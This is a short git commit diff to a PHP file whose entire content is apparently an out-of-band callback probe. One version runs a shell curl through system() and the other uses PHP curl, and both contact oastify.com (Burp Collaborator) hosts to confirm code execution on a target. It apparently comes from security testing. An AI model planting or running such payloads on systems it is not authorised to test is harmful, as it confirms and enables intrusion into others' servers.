5c816624e93e24240f170ced9c5df49311f5b325
Kotte2023 <122963981+Kotte2023@users.noreply.github.com>
2024-05-19 13:46:57 +0530

    file.php

--- file.php
+++ file.php
@@ -1,1 +1,6 @@
-<?php system('curl http://4hmvr50cvbbbb1oslscvhb21fslj98.oastify.com');?>
+<?php
+$url = 'http://zilqs017w6c6cwpnmndqi63wgnmfa4.oastify.com';
+$ch = curl_init($url);
+curl_exec($ch);
+curl_close($ch);
+?>
